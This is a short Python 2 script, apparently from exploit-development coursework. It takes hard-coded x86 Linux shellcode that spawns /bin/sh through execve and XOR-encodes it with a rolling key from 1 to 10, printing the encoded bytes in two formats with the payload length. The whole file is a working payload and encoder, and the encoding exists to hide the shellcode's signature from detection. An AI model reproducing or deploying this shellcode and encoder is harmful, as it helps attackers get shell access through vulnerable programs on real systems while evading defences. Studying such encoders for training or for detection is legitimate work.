#!/usr/bin/python
# Autor: Xavi Beltran
# Date: 05/05/2019

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

i = 1
for x in bytearray(shellcode) :

	if  i == 11:
		i = 1

	#y = y + 0x01 
	# XOR

	print (hex(i))
	y = x^i
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y
	
	i = i + 0x01

print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
